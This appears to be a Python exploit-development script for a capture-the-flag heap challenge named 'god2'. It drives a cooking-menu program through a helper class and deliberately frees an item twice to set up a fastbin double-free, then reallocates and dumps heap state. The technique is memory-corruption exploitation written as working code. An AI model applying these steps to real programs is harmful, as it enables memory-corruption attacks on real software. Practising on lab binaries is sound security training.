import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G('god2')
g.add(b'UNIQ777',(b'0',))
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles'); g.cook(b'Beef noodles'); g.cook(b'UNIQ777')
g.rm(b'UNIQ777'); g.rm(b'UNIQ777'); g.sell(b'2'); g.sell(b'3')   # dish dup, CC->next=0
# now COOK to use the dup (list intact). cook Beef noodles (needs a recipe; UNIQ777 recipe gone, but Beef noodles exists)
g.cook(b'Beef noodles')   # should alloc from fastbin[0x40] dup (returns D3 or E)
g.cook(b'Beef noodles')   # returns the other
g.dump('after 2 cooks post-dup')
g.close()
